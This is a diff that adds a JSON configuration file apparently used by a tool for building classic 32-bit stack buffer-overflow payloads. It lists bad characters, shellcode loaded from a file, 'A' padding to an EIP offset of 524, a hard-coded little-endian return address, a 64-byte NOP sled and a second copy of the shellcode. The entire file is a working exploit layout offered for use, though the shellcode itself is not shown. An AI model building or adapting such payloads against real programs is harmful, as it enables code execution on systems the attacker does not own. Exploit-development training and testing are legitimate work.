@@ -1,0 +1,35 @@
+{
+  "_comment": "Offset-based 32-bit layout — shellcode can be any size.",
+  "_comment2": "pad_to_offset auto-calculates how much padding is needed.",
+
+  "badchars": "000a0d",
+
+  "segments": [
+    {
+      "name": "shellcode",
+      "bytes_file": "sc.bin",
+      "_comment": "Shellcode goes first, any size"
+    },
+    {
+      "name": "pad_to_eip",
+      "pad_to_offset": 524,
+      "pad_byte": "0x41",
+      "_comment": "Pads exactly enough bytes to reach offset 524"
+    },
+    {
+      "name": "ret",
+      "value": "0x14802400",
+      "width": 4,
+      "endian": "little"
+    },
+    {
+      "name": "nop_sled",
+      "repeat": { "byte": "0x90", "count": 64 }
+    },
+    {
+      "name": "shellcode2",
+      "bytes_file": "sc.bin",
+      "_comment": "Optionally append shellcode a second time after the sled"
+    }
+  ]
+}
